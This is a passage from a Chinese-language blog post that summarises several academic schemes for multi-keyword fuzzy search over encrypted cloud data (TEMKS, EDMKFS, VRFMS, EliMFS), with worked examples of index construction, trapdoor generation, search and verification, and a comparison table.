1、总体思路\n\n该方案利用**局部敏感哈希**和**布隆过滤器**来实现**模糊关键字搜索**，开发了一种基于 **uni-gram 关键字转换**新方法。此外，使用**词干分析算法**查询具有相同根的关键字。在选择适当的匹配文件集时，该方案会考虑关键字权重。\n\n本文的主要贡献归纳如下:\n\n- 1.开发了一种基于 **uni-gram 的关键词转换**新方法。对于一个字母的拼错，该方法减小了拼错关键字与正确关键字之间的欧几里德距离。此外，我们引入**词干提取算法**来获取单词的词根。\n- 2.在构建结果的排名列表时考虑**关键字权重**。与关键字更相关的文件将有更大的机会出现在列表的首位。\n- 3.使用真实数据集来实施和评估我们提出的方案。实验结果表明，本文提出的算法具有较高的精度。\n\n### 2、使用技术\n\n- 局部敏感哈希函数\n- 布隆过滤器\n- 安全近邻算法\n- uni-gram 关键字变换\n- 波特词干算法\n- 词频-逆文档频度（TF-IDF）\n\n### 3、方案实现\n\n![](https://img.jwt1399.top/img/image-20220209195204896.png)\n\n### 4、总结\n\n引入了基于uni-gram 模型的 porter 词干提取算法和关键字转换算法，极大地提高了模糊搜索精度。然而，仅使用术语频率对结果进行排序，这会导致排序结果不准确和高计算开销。\n\n## ④EDMKFS方案\n\n**论文名称：《Efficient dynamic multi-keyword fuzzy search over encrypted cloud data》**\n\n- 作者：洪忠，詹飞利，杰翠，岳孙，陆流\n- 单位：安徽大学\n- 来源：[Journal of Network and Computer Applications](https://www.sciencedirect.com/science/article/abs/pii/S1084804519303297?via%3Dihub#!)【CCF C】\n- 时间：2020年1月\n- 方案效率\n  - 精确搜索100%\n  - 模糊搜索85%\n\n### 1、总体思路\n\n该方案利用**局部性敏感散列**和**布隆过滤器**用于生成索引向量和查询向量。基于生成的向量，构建**平衡二叉树**作为整个文件集的索引，并开发 **Top-k 搜索算法**，借助索引树搜索与给定查询最相关的 k 个文件。\n\n本文的主要贡献归纳如下:\n\n- 1.开发了一种动态多关键字模糊搜索方案，实现了**容错的多关键字模糊搜索**，并支持\n  文件的高效**动态更新**。\n- 2.引入一种**平衡二叉树**来组装所有布隆索引向量。基于此树，一个搜索请求的搜索时间为O(rlogn)，优于以往类似的模糊搜索方案。\n- 3.通过综合实验，验证了该方案的有效性。\n\n### 2、使用技术\n\n- 局部敏感哈希函数\n- 布隆过滤器\n- 安全近邻算法\n- uni-gram 关键字变换\n- 平衡二叉树\n- 词频-逆文档频度（TF-IDF）\n- Top-k 搜索算法\n\n### 3、方案实现\n\n#### 基于 uni-gram 的关键字转换\n\n从文件集合中提取的关键字首先转换为 uni-gram 向量表示，以便使用 LSH 函数进行映射\n\n- 首先，每个关键字被分割成一个 uni-gram 集合。\n  - 例如，关键字 “secure” 被转换为{s1，e1，c1，u1，r1，e2}，其中 “e1” 是 “secure” 中的第一个 “e”，而“e2” 是第二个 “e”。\n- uni-gram 集合用一个 160 位的向量表示，向量组成为 26∗5+30 bits，其中 26∗5 bits 代表 26∗5 个字母，30 bits 表示常用的符号和数字。如果给定的位表示相应的 uni-gram，则将其设为 1。\n\n通过这种方式，不同的关键字被转换为 160 位长度的向量表示。拼写错误的关键字仍然可以转化为与其对应的正确关键字高度相似的向量。\n\n#### 基于BF的索引/查询向量\n\n将原始关键字转换为向量后，使用 LSH 函数将向量映射到 Bloom filter。为每个文件生成一个 m 位 Bloom 过滤器，并将其所有关键字向量散列到 Bloom 过滤器上。每个关键字向量都用 l 个不同的 LSH 函数散列在不同的位置上，它们对应的位置设置为 1。在实现过程中，数字 “1” 被替换为关键字权重 TF，以反映关键字和文件的相关性。\n\n- TF<sub>i,j</sub> = 1 + |w<sub>j</sub>| / |f<sub>j</sub>|\n  - |w<sub>j</sub>| 是在 f<sub>i </sub>中关键字 w<sub>j</sub> 的数量\n  - |f<sub>j</sub>| 是在 f<sub>i </sub>中所有关键字的数量\n\n查询向量和索引向量的内积（即 Score）反映了查询和文件的相关性\n\n通常，Score > 0 表示文件包含查询关键字。但由于布隆过滤器的假阳性，上述情况并非如此。在所提出的方案中，该阈值被设置为TH = l，这意味着根据查询只会选择 Score ≥ TH 的文件\n\n![](https://img.jwt1399.top/img/image-20220209112928029.png)\n\n#### 索引树的构造\n\n为了提高模糊搜索的效率，该方案引入了一个平衡的二叉树来组装所有的布隆索引向量。因此，将只检索最需要的文件，从而避免遍历树中的所有索引向量。\n\n索引树的结构：\n\n- 如果(n = 2k)，(k = 1,2,3，···)：每对叶节点 D<sub>2k−1</sub> 和 D<sub>2k</sub> 都会生成一个父节点 D<sub>u</sub>，每个父节点 D<sub>u </sub>存储一个满足 D<sub>u</sub>[i] = max{D<sub>2k−1</sub>[i]，D<sub>2k</sub>[i]}的 m 位向量；n为文件个数\n\n- 如果(n = 2k+1)，(k = 1,2,3，···)：前 D<sub>2k </sub>叶节点以上方同样的方式进行整合。此外，第 2k+1 个叶节点 D<sub>2k+1 </sub>与第 D<sub>2k </sub> 个节点的父节点进行整合。\n\n- 每个**叶节点**与一个文件相关联，存储相应**文件的标识符**和**布隆索引向量**。\n\n- 内部节点基于叶节点生成。\n- **父节点**索引向量中的值是**子节点**索引向量中相应位的**较大值**。\n  - 例如，r<sub>21</sub>[3] = max{f<sub>1</sub>[3]，f<sub>2</sub>[3]} = max{1.5，1} = 1.5。\n\n这样**子节点**就被它们的**父节点覆盖**，这意味着一旦父节点中的索引向量不满足搜索条件，它们的子节点就会被忽略。\n\n#### 基于索引树的 top-k 搜索\n\n方案中使用的搜索算法是由 Xia 等人(2016)提出的 GDFS（贪婪深度优先搜索）\n\n为在平衡二进制树(KBB)上搜索顶级相关文件而设计的算法与基于 Bloom 索引向量的树非常兼容。\n\n如图所示(GDFS)，构造了一个搜索结果列表，即 RList，它由 k 条记录组成，每条记录定义为 <RScore,FID>。\n\n- RScore 表示 f<sub>FID</sub> 文件与给定查询的关联分数。它是索引向量与查询向量(陷门向量)的内积的值。\n- RList 中的这 k 条记录对应于搜索的文件，因此这个列表根据它们与给定查询的相关性，以及它们的 RScore，按照降序排序。我们将 RList 中最小的 RScore 表示为第 k 个分数，初始化为阈值 TH，在搜索过程中可以修改。\n\n由于子节点被其父节点覆盖，搜索算法可以更快，这是因为进程只需要搜索索引树的一小部分，而不是整个树。例如，对于文件集合 f = {f1，f2，…，f7}，k = 2，阈值 TH = 2，查询向量将为 q =（0,1,1,0,0），搜索过程如图所示\n\n![](https://img.jwt1399.top/img/image-20220209135149217.png)\n\n在这个例子中，在文件集合 f = {f1，f2，…，f7}，我们搜索最相关的 2 个文件(k=2)到查询 q = (0,1,1,0,0)。这里，相关阈值 TH = 2。搜索过程从根节点开始。相关性得分S<sub>r</sub> = 2.7 > TH = 2（因为查询向量第2，3位为1，所以计算Score是计算2，3位数字之和），搜索 r<sub>11</sub>，因为S<sub>r</sub><sub>11</sub> = 2.7 > S<sub>r12</sub>= 2.2 > TH。在下一跳中，r<sub>21</sub> 在搜索中被选中，后面跟着 f<sub>1</sub>。S<sub>f1</sub> = 2.7 > TH，将 f1 添加到结果列表中，返回到 r<sub>21</sub>，当搜索到达 f<sub>2</sub> 时，添加 f<sub>2</sub>。注意，S<sub>r22</sub> = 1 < TH，因此进程将停止搜索其子节点，然后搜索 f<sub>7</sub>，S<sub>f7</sub> = 2.2 > S<sub>f2</sub> = 2.1 > TH，因此 f<sub>2</sub> 被删除，f<sub>7</sub> 被添加到结果列表中。最后，我们得到搜索结果 f<sub>1</sub>，f<sub>7</sub>\n\n##  ⑤VRFMS方案\n\n**论文名称：《VRFMS: Verifiable Ranked Fuzzy Multi-keyword Search over Encrypted Data》**\n\n- 作者：李兴华; 童秋云; 赵金伟; 苗银斌; 马思琪; 翁健; 马剑峰; Kim-Kwang Raymond\n- 单位：西安电子科技大学\n- 刊物：[IEEE TRANSACTIONS ON SERVICES COMPUTING](https://ieeexplore.ieee.org/abstract/document/9669122)【CCF B】\n- 时间：2022年1月\n- 方案精度\n  - 精确搜索100%\n  - 模糊搜索91%\n\n### 1、总体思路\n\n该方案首先对现有的 LSH 和 BF 体系结构进行了改进，以实现高精度的模糊关键字搜索。随后分别引入同态 MAC 和随机挑战技术来验证返回结果的正确性和完整性。\n\n本文的主要贡献归纳如下:\n\n- （1）使用 LSH、BF 和 TF-IDF 支持模糊多关键字搜索\n- （2）设计了一种改进的 bi-gram 关键字变换方法，考虑到相同 bi-gram 的出现，进一步提高了模糊关键字搜索的准确性，最高准确率可达 91%\n- （3）利用同态 MAC 和随机挑战技术来保证搜索结果的正确性和完整性。\n\n### 2、使用技术\n\n- 局部敏感哈希函数\n- 布隆过滤器\n- 安全近邻算法\n- bi-gram 关键字变换\n- 波特词干算法\n- 词频-逆文档频度（TF-IDF）\n\n\n------\n\n### 3、方案实现\n\n![](https://img.jwt1399.top/img/image-20220209170116580.png)\n\n####  密钥生成算法\n\nKeyGen(1<sup>λ</sup>, m)→SK具体步骤如下：（λ：随机安全参数，m：索引长度）\n\n- （1）根据安全参数 λ，数据所有者调用 RealHomMac，生成密钥（K，α）\n\n- （2）随机构建 2 个(m+2) × (m+2) 维的矩阵 M<sub>1</sub> , M<sub>2</sub> ∈ Ｒ<sup>(m+2) × (m+2)</sup>\n- （3）随机构建一个 m+2 维的向量 S ∈ { 0 , 1 }<sup>m+2</sup> ，且 S 中 0 和 1 的数量需要大致相同\n- （4）输出 SK = (K， α，M<sub>1</sub>，M<sub>2</sub>，S) 作为**生成加密索引**和**生成陷门**的**密钥**\n\n#### 索引生成算法\n\nBuildIndex(F, SK)→Enc<sub>sk</sub>(I)生成安全索引，具体步骤如下:（F：文件集合，SK：密钥）\n\n- **（1）数据预处理**\n  - 对于文件集合 F = { f<sub>1</sub> , f<sub>2</sub> ,…, f<sub>n</sub> }中的每一个文件 f<sub>i</sub> 所对应的关键字集合 W<sub>i</sub> = { w<sub>1</sub> , w<sub>2</sub> ,…, w<sub>t</sub> }，使用 [波特词干算法](https://tartarus.org/martin/PorterStemmer/) 将获得词干关键词集合 ST = { st<sub>1</sub> , st<sub>2</sub> ,…, st<sub>t</sub> }，根据 ST 计算 TF 和 IDF 值\n- **（2）关键词转换**\n  - 使用改进的关键字转换方法 bi-gram，将每个关键字转换为集合 BS，考虑了相同 bi-gram 的出现，然后将 BS 转换为固定长度的二进制向量 BV \n  - 例如，关键字 \"represent\" 表示 BS = {re<sub>1</sub>，ep<sub>1</sub>，pr<sub>1</sub>，re<sub>2</sub>，es<sub>1</sub>，se<sub>1</sub>，en<sub>1</sub>，nt<sub>1</sub>}\n- **（3）构建索引**\n  - ① 为文件 f<sub>i</sub> 构建一个 m bit 的**布隆过滤器 B**<sub>i</sub>，初始化为 0 \n  - ②对于向量集合 BV = { bv<sub>1</sub> , bv<sub>2</sub> ,…, bv<sub>t</sub> } 中的每个向量 bv<sub>i</sub>，使用 l 个**局部敏感哈希函数** { H<sub>1</sub> , H<sub>2</sub> ,…, H<sub>l</sub>  } 进行计算(H<sub>1</sub>(bv<sub>i</sub>) , H<sub>2</sub>(bv<sub>i</sub>) ,…, H<sub>l</sub>(bv<sub>i</sub>) )，计算在 B<sub>i</sub> 中相应的位置 ，并将每个位置设置为 TF<sub>i,j</sub> / l\n    - TF<sub>i,j</sub> = 1 + |w<sub>j</sub>| / |f<sub>j</sub>|， |w<sub>j</sub>| 是在 f<sub>i </sub>中关键字 w<sub>j</sub> 的数量，|f<sub>j</sub>| 是在 f<sub>i </sub>中所有关键字的数量\n    - 如果将不同的关键字散列到同一位置，我们将使用它们的平均值作为插入\n  - ③ 将  B<sub>i</sub> 扩展为 (m+2) 位，扩展值为 ε<sub>1 </sub>和 1\n- **（4）索引加密**\n  - ①将密钥 SK 中的 S 表示为 S = (s<sub>1</sub> , s<sub>2</sub> ,…, s<sub>m+2</sub>)。对于每一个文件 f<sub>i</sub> 所得到的布隆过滤器 B<sub>i</sub>\n  -  随机选择参数 r ∈  R\n  - ② 将 B<sub>i</sub>  表示为 B<sub>i</sub> = ( b<sub>1</sub> , b<sub>2</sub> ,…, b<sub>m+2</sub>)。 B<sub>i</sub>  与 S 具有同样的结构，均为由 {0,1} 组成的 m+2 位向量。对于 B<sub>i</sub> 中的每一个 b<sub>j</sub> ，\n    - 若在 S 中对应的 s<sub>j</sub> = 1 ，则令 b'<sub>j</sub> =  b''<sub>j</sub> = b<sub>j</sub> ；\n    - 若在 S 中对应的 s<sub>j</sub> = 0，则令 b'<sub>j</sub> = 1/2b<sub>j</sub> + r  、b''<sub>j</sub> = 1/2b<sub>j</sub> - r\n  - ③ 令 B'<sub>i </sub> =  ( b'<sub>1</sub> , b'<sub>2</sub> ,…, b'<sub>m+2</sub>)，B\"<sub>i </sub> =  ( b\"<sub>1</sub> , b\"<sub>2</sub> ,…, b\"<sub>m+2</sub>)\n  - ④ 计算 I'<sub>i</sub> = M<sub>1</sub><sup>T</sup> • B'<sub>i </sub> , I\"<sub>i</sub> = M<sub>2</sub><sup>T</sup> • B\"<sub>i </sub> \n  - ⑤ 令  I<sub>i</sub> = (I'<sub>i</sub> ，I\"<sub>i</sub> ) \n  - ⑥输出加密索引 Enc<sub>sk</sub>(I)= ( I<sub>1</sub> , I<sub>2</sub> ,…, I<sub>n</sub> )，n 是文件集合中的文件数\n\n**索引生成实例**\n\n我们通过一个实例展示了索引的建立过程。为了简单起见，我们假设某个文件有两个关键字“ranked”和“searched”\n\n- W = {ranked，searched}，设 m = 10，S = [1,0,0,1,0,0,1,1,0,0,1,1] ，并假设（M1，M2）都是可逆矩阵。\n- 首先 对 W 用波特词干算法转换为 ST = {rank，search}\n- 关键字 “rank” 使用 bi-gram 转换为 BS<sub>1</sub>= {ra<sub>1</sub>，an<sub>1</sub>，nk<sub>1</sub>}，再转换为 BV<sub>1</sub> \n- BS<sub>2</sub> 和 BV<sub>2</sub> 是用同样的方法为关键字 “search” 生成的\n- 分别使用 BV<sub>1</sub> 和 BV<sub>2</sub> 作为 LSH 函数的两个输入，并在其计算结果的位置设置 TF 值 0.5\n- B<sub>i</sub>  = [0.5,0,0,0,0,0,0,0.5,0,0.5]，它被扩展为[0.5,0,0,0,0,0,0,0,0,0,0,0.5,0.5,0.5,1]，使用值 0.5 和 1 。\n- B'<sub>i </sub>= [0.5, 0.1, 0.1, 0,0.1, 0.35, 0, 0.5, 0.1, 0.35, 0.5, 1]，B\"<sub>i </sub> = [0.5, -0.1, -0.1, 0,-0.1, 0.15, 0, 0.5, -0.1, 0.15, 0.5, 1]\n- 最后， B'<sub>i </sub> 和 B\"<sub>i </sub> 用矩阵（M<sub>1</sub> , M<sub>2</sub>）加密，最后的结果是Enc<sub>sk</sub>(I<sub>i</sub>) = { I'<sub>i</sub> = M<sub>1</sub><sup>T</sup> • B'<sub>i </sub> , I\"<sub>i</sub> = M<sub>2</sub><sup>T</sup> • B\"<sub>i </sub> } =[0.5,0.1,0.1,0.1,0,0.1,0.35,0.5,0.1,0.35,0.5,0.5,-0.1,-0.1,-0.1,0.15,0.5,-0.1]\n\n#### 陷门生成算法\n\nTrapdoor(W<sub>k</sub>, SK)→Enc<sub>sk</sub>(Q)根据查询关键词集合生成安全陷门，具体步骤如下:\n\n- （1）前两步与索引建立生成 BV 的前两个步骤完全相同\n- （2）构建一个 m 位的布隆过滤器 Q 。\n- （3）使用 LSH 函数将每个关键字的 bi-gram 向量映射到布隆过滤器 Q 中，将 Q 的对应位置设置为其 IDF 值，将陷门向量 Q 乘以 ε<sub>2</sub>，并将其扩展为（m+2）位向量，其值为 ε<sub>2</sub> 和 t \n- （4）将密钥 sk 中的 S 表示为 S = (s<sub>1</sub> , s<sub>2</sub> ,…, s<sub>m+2</sub>)。对于布隆过滤器 Q，\n\n  - ① 随机选择参数 r' ∈  R\n  - ② 将 Q<sub>i</sub>  表示为 Q<sub>i</sub> = (q<sub>1</sub> , q<sub>2</sub> ,…, q<sub>m+2</sub>)。 Q<sub>i</sub>  与 S 具有同样的结构，均为由 {0,1} 组成的 m+2 位向量。对于 Q 中的每一个 q<sub>j</sub> ，\n    - 若在 S 中对应的 s<sub>j</sub> = 0 ，则令 q'<sub>j</sub> =  q''<sub>j</sub> = q<sub>j</sub> ，\n    - 若在 S 中对应的 s<sub>j</sub> = 1，则令 q'<sub>j</sub> = 1/2q<sub>j</sub> + r'  、q''<sub>j</sub> = 1/2q<sub>j</sub> - r'\n  - ③ 令 Q' =  ( q'<sub>1</sub> , q'<sub>2</sub> ,…, q'<sub>m+2</sub>)，Q\" =  ( q\"<sub>1</sub> , q\"<sub>2</sub> ,…, q\"<sub>m+2</sub>)\n- （5）输出陷门 Enc<sub>sk</sub>(Q) = {M<sub>1</sub><sup>-1</sup> • Q' , M<sub>2</sub><sup>-1</sup> • Q\"}。\n\n**陷门生成实例**\n\n我们通过一个实例展示了陷门的建立过程。为了简单起见，我们假设查询关键字为 “ranked” 和 “searched”\n\n- BS<sub>1</sub> ， BV<sub>1</sub>，BS<sub>2</sub> ， BV<sub>2</sub> 是用索引的建立过程同样方法生成的\n- 分别使用 BV<sub>1</sub> 和 BV<sub>2</sub> 作为 LSH 函数的两个输入，并在其计算结果的位置设置 IDF 值 log(0.5) = -0.3\n- Q  = [0, -0.3, 0, 0, 0, -0.3, 0, -0.3, 0, -0.3]，它被扩展为 [0, -0.3, 0, 0, 0, -0.3, 0, -0.3, 0, -0.3, 1, -0.1] ，使用值 1 和 -0.1 \n- Q' = [0.1,-0.3, 0, 0.1, 0, -0.3, 0.1, -0.05, 0, -0.3, 0.6, 0.05] ，Q\" = [-0.1, -0.3, 0, -0.1, 0, -0.3, -0.1, -0.25, 0, -0.3, -0.6, -0.15] \n- 最后， Q' 和 Q\"  用矩阵（M<sub>1</sub> , M<sub>2</sub>）加密，最后的结果是Enc<sub>sk</sub>(I<sub>i</sub>) = { I'<sub>i</sub> = M<sub>1</sub><sup>-1</sup> • Q'  , I\"<sub>i</sub> = M<sub>2</sub><sup>-1</sup> • Q\"  } = [0.1, -0.3, 0, 0.1, 0, -0.3, 0.1, -0.05, 0, -0.3, 0.6, 0.05, -0.1, -0.3, 0, -0.1, 0, -0.3,-0.1, -0.25, 0, -0.3, -0.6, -0.15]\n\n#### 认证算法\n\nAuth(SK, L, Enc<sub>sk</sub>(I) or Enc<sub>sk</sub>(Q))→σ<sub>I</sub> or σ<sub>Q</sub> 身份验证标记生成算法，该算法为每个加密的索引或加密的陷门生成认证标签。\n\n- 代理服务器首先对 Enc<sub>sk</sub>(I<sub>i</sub>) 或 Enc<sub>sk</sub>(Q) 的每一项进行标记\n- Enc<sub>sk</sub>(I<sub>i</sub>)[j] 被标记为 L<sub>Enc<sub>sk</sub>(I<sub>i</sub>),j</suB> 表示在 i 位置的 索引 I<sub>i</sub> 中的第 j 项\n- Enc<sub>sk</sub>(Q)[j] 被标记为 L<sub>Enc<sub>sk</sub>(Q),j</suB> 表示陷门 Q 中的第 j 项\n- 然后，对于加密索引 Enc<sub>sk</sub>(I<sub>i</sub>) 中的每一项 Enc<sub>sk</sub>(I<sub>i</sub>)[j]，代理服务器调用 Real-HomMAC\n- Auth(SK，L<sub>Enc<sub>sk</sub>(I<sub>i</sub>),j</suB>，Enc<sub>sk</sub>(I<sub>i</sub>)[j]) 输出 (y<sub>0</sub><sup>(j)</sup>, y<sub>1</sub><sup>(j)</sup>) = (Enc<sub>sk</sub>(I<sub>i</sub>)[j],(r<sub>i,j</sub> − Enc<sub>sk</sub>(I<sub>i</sub>)[j])/α\n- 式中 r = F<sub>K</sub>(L<sub>Enc<sub>sk</sub>(I<sub>i</sub>),j</suB>)。这样，代理为加密索引 Enc<sub>sk</sub>(I<sub>i</sub>) 生成认证标签 σ<sub>I<sub>i</sub></sub>\n- 代理服务器为加密的陷门 Enc<sub>sk</sub>(Q) 生成认证标签 σ<sub>Q</sub> 。\n\n#### 搜索算法\n\nSearch(f, σ<sub>I</sub> , σ<sub>Q</sub>)→σ 模糊关键词搜索算法，模糊关键词搜索函数f、索引标记 σ<sub>I</sub> 和陷门标记 σ<sub>Q </sub>作为输入，并输出结果 σ =（σ<sub>0</sub>，···，σ<sub>k</sub>）具体步骤如下:\n\n- 加密陷门获得相关分数 sco<sub>i</sub> = f(Enc<sub>sk</sub>(I) , Enc<sub>sk</sub>(Q))，选择相关度最高的 k 个搜索结果，最后，对于 k 个搜索结果，比如 f<sub>i</sub>，调用 RealHomMac，Eval（f，{σ<sub>I</sub> , σ<sub>Q</sub>}）以输出其证明 σ<sub>i</sub> = (y<sub>0</sub>, y<sub>1</sub>, y<sub>2</sub>)\n\n- （1）将索引 I 表示为 I =  ( I<sub>1</sub> , I<sub>2</sub> ,…, I<sub>n</sub> ) 对于每一个 I<sub>i </sub>\n  - ① 将 I<sub>i </sub>表示为 I<sub>i  </sub>= (I'<sub>i</sub> ，I\"<sub>i</sub> ) ，将 t 表示为 t = (t'，t\") \n  - ② 计算向量的数量积： R<sub>I</sub> = I'<sub>i</sub> • t'  + I\"<sub>i</sub>  • t\"\n  - ③ 按排序算法将计算的向量内积(数量积)作排序\n\n#### 验证算法\n\nVerify(SK, P, sco<sub>i</sub>, σ<sub>i</sub>)\n\n- 设 P= (f, L<sub>Enc<sub>sk</sub>(I<sub>i</sub>)</suB>，L<sub>Enc<sub>sk</sub>(Q)</suB>) 代理服务器调用 Real-HomMAC。\n- Verify(SK, P, sco<sub>i</sub>, σ<sub>i</sub>)，根据如下公式验证 sco<sub>i</sub> 的正确性。\n  - 如果公式成立，代理服务器接受 f<sub>i</sub> 作为搜索结果\n  - 否则拒绝 f<sub>i</sub> \n\n![](https://img.jwt1399.top/img/image-20220323001152007.png)\n\n\n\n#### 更新算法\n\nUpdate(F<sub>temp</sub>, SK)\n\n该算法包括添加文件、删除文件和修改文件三个操作。在添加文件时，代理服务器对文件进行加密，调用 Auth 为其生成身份验证标记，最后将其外包给云服务器。当删除文件时，代理服务器需要与云服务器进行交互，删除对应的密文和索引。对于文件修改，相当于删除原始文件，然后添加一个新文件\n\n## ⑥EliMFS方案\n\n**论文名称：《EliMFS: Achieving Efficient, Leakage-Resilient, and Multi-Keyword Fuzzy Search on Encrypted Cloud Data》**\n\n- 作者：陈静; 何坤; 邓兰; 泉源; 杜瑞英; 杨翔; 吴杰\n- 单位：武汉大学\n- 刊物：[IEEE Transactions on Services Computing](http://ieeexplore-ieee-org-s.vpn.uestc.edu.cn:8118/document/8078212)【CCF B】\n- 时间：2017年10月\n\n### 1、总体思路\n\n该方案利用了一种新颖的**两阶段索引结构**来确保搜索时间与文件集大小无关。多关键字模糊搜索通过基于 **bi-gram ** **布隆过滤器**和**局部敏感散列**的精细设计实现的。此外，考虑到由两阶段索引结构引起的泄漏，我们提出了两种具体的方案来抵抗不同威胁模型中的这些潜在攻击。\n\n本文的主要贡献归纳如下:\n\n- （1）这是第一个针对加密云数据的**多关键字模糊搜索方案**，其搜索复杂性与文件大小无关;\n- （2）与现有的多关键字模糊搜索解决方案相比，我们设计了一种新颖的**两阶段索引结构**和相应的搜索算法，以提高对加密云数据的搜索效率;\n- （3）为了保护数据隐私，我们分析了不同威胁模型中框架可能存在的泄漏，并提出了两种实现**泄漏弹性**的具体方案;\n- （4）对隐私和效率进行了全面分析，对真实世界数据集的实验进一步表明，我们的设计在搜索过程中具有较低的开销。\n\n### 2、使用技术\n\n- 局部敏感哈希函数\n- 布隆过滤器\n- 安全近邻算法\n- bi-gram 关键字变换\n- 倒排索引\n\n###  3、方案实现\n\n![](https://img.jwt1399.top/img/he2-2765323-small.gif)\n\n- 首先构建了一个包含各种文件标识符和关键字的两阶段安全索引。\n- 搜索复杂性仅由查询中与一个关键字关联的文件数决定，而不是整个文件集大小\n- 在第一阶段索引中，每个关键字都转换为一个标记，该标记指向包含此关键字的所有文件标识符。\n- 第二个索引恰恰相反，它由所有文件标识符及其匹配的关键字生成。\n\n- 考虑到隐私，当我们使用这个框架时，每个文件标识符都会被算法 Enc 加密。\n- 对于模糊搜索函数，将关键字 w<sub>i </sub>转换为中间值 Vi，\n- V<sub>i</sub> 通过顺序计算 2-gram 序列的 26 x 26 位数组和 LSH 值。\n- 在第一级索引中，由 tagi 被 vi 和 伪随机函数 F(x) 创建。\n- 在第二阶段索引中，每个文件标识符都映射到一个 Bloom Filter，该过滤器由多关键字的所有中间值推导而成。\n- 在这种两阶段索引结构中，第一阶段能够高效地执行单关键字搜索，并在多关键字搜索中缩小搜索范围。\n- 第二阶段用于估计第一阶段的结果是否确实包含所有目标关键字\n\n#### EliMFS-B\n\n##### 密钥和安全索引生成\n\n![](https://img.jwt1399.top/img/he.t2-2765323-large.gif)\n\n步骤一：生成密钥\n\n- 两个随机序列（K<sub>1</sub>，K<sub>2</sub>）\n- 两个可逆矩阵（M<sub>1</sub>，M<sub>2</sub>）\n- 一个向量 S\n\n步骤二：建立文件索引\n\n- 通过 l hash 函数计算中间值 V<sub>w</sub> 、通过伪随机函数 F 加密 V<sub>w </sub>计算标记 tag、\n- 通过 K<sub>2 </sub>  和 V<sub>w</sub> 生成加密文件标识符的密钥 K<sub>e</sub>\n- 用 K<sub>e </sub> 加密文件标识符 id 得到 e ，并附加到 I<sub>1</sub>[tag]，得到 I<sub>1</sub>\n- 设置布隆过滤器 h<sub>1</sub>(V<sub>w</sub>),h<sub>2</sub>(V<sub>w</sub>),...,h<sub>k</sub>(V<sub>w</sub>) 位置的 I<sub>2</sub>\\[id][i] = 1\n\n步骤三：使用[KNN算法](https://www.eecis.udel.edu/~ruizhang/CISC859/S17/Paper/p1.pdf)加密索引 I<sub>2</sub> \n\n- 将 布隆过滤器 I 分裂成两个向量 {I' ，I\"}\n- 根据 S 计算  I<sub>2</sub>[id] = {M<sub>1</sub><sup>T</sup> • I' ，M<sub>2</sub><sup>T</sup> • I\"}\n- 得到 Index = {I<sub>1</sub>， I<sub>2</sub>}\n\n##### 陷门生成\n\n![](https://img.jwt1399.top/img/he.t3-2765323-large.gif)\n\n步骤一：\n\n- 假设在第一阶段搜索中选择的关键字是 w<sub>1</sub>\n- 那么数据所有者首先计算中间值 V<sub>w1</sub>、标记 tag、加密文件标识符的密钥 K<sub>e</sub>\n- 如果 n(关键字个数) = 1，则不执行下两个步骤，直接将标记tag发送到云服务器。\n\n步骤二：\n\n- 构建 m-bits 布隆过滤器 Bf<sub>q</sub>\n- 每个关键字都用 l LSH 处理，并用 k hash 函数 插入到 Bf<sub>q</sub> 中\n\n步骤三：\n\n- Bf<sub>q </sub>使用 M<sub>1</sub>，M<sub>2</sub>，S 加密，方法与索引加密类似\n\n- 数据所有者选择一个阈值 thr ≤ k|w|，thr 被用来比较内积，在第二个搜索阶段来判断是否应该返回文件 ID\n- 发送 Token = {tag，M<sub>1</sub><sup>-1</sup> • Bf<sub>q</sub>' ，M<sub>2</sub><sup>-1</sup> • Bf<sub>q</sub>\"，K<sub>e</sub>，thr} 到云服务器\n\n##### 搜索算法\n\n![](https://img.jwt1399.top/img/image-20220209214026209.png)\n\n步骤一：\n\n- 收到陷门后，读取所有 I<sub>1</sub>[tag]\n- 如果 Token = {tag}，云服务器返回这些标识符并完成算法\n- 如果 Token = {tag，M<sub>1</sub><sup>-1</sup> • Bf<sub>q</sub>' ，M<sub>2</sub><sup>-1</sup> • Bf<sub>q</sub>\"，thr}，云服务器逐个检查 I<sub>1</sub>[tag] 的布隆过滤器\n\n步骤二：\n\n- 用 K<sub>e </sub>解密文件标识符 e 得到 id，从而得到 I<sub>2</sub>[id] = {M<sub>1</sub><sup>T</sup> • I' ，M<sub>2</sub><sup>T</sup> • I\"}\n- {M<sub>1</sub><sup>-1</sup> • Bf<sub>q</sub>' ，M<sub>2</sub><sup>-1</sup> • Bf<sub>q</sub>\"} 和 {M<sub>1</sub><sup>T</sup> • I' ，M<sub>2</sub><sup>T</sup> • I\"} 进行内积得到 I<sup>T</sup> • Bf<sub>q</sub>\n- 如果  I<sup>T</sup> • Bf<sub>q</sub> ≥ thr 将文件标识符 id 添加到结果集中\n\n#### EliMFS-E\n\n##### 密钥和安全索引生成\n\n![](https://img.jwt1399.top/img/image-20220209214256137.png)\n\n##### 陷门生成\n\n![](https://img.jwt1399.top/img/image-20220209214546891.png)\n\n##### 搜索算法\n\n![](https://img.jwt1399.top/img/image-20220209214731732.png)\n\n## ②～⑥方案总结\n\n### 对比\n\n| 编号 | 方案/技术 | LSH  |  BF  | KNN  |   Gram   | 索引建立                      |\n| ---- | :-------- | :--: | :--: | :--: | :------: | ----------------------------- |\n| 2    | MKFS      |  ✅   |  ✅   |  ✅   |    ——    | 对偶编码函数                  |\n| 3    | TEMKS     |  ✅   |  ✅   |  ✅   | uni-gram | Porter Stemming、TF-IDF       |\n| 4    | EDMKFS    |  ✅   |  ✅   |  ✅   | uni-gram | KBB、 Top-k、TF-IDF           |\n| 5    | VRFMS     |  ✅   |  ✅   |  ✅   | bi-gram  | Porter Stemming、TF-IDF       |\n| 6    | EliMFS    |  ✅   |  ✅   |  ✅   | bi-gram  | inverted index、forward index |\n\n### 遗留问题\n\n1. 为什么模糊查询的 Inner Product 和 Socre 比较来确定文本相关性？\n\n如果一个文档在查询中包含关键字，那么两个向量对应的位将为 1 ，因此内积将返回一个高值。因此，这个简单的内积结果是一个很好的衡量匹配关键字的数量。\n\n通常，Score > 0 表示文件包含查询关键字。但由于布隆过滤器的假阳性，上述情况并非如此。在所提出的方案中，该阈值被设置为TH = l，这意味着根据查询只会选择 Score ≥ l 的文件\n\n2. 布隆过滤器中 局部敏感哈希函数个数如何确定？\n\n请参考小简写的另外一篇文章：[布隆过滤器VS布谷鸟过滤器 | 简简 (jwt1399.top)](https://jwt1399.top/posts/35196.html)\n\n## Sponsor❤️\n\n您的支持是我不断前进的动力，如果您感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  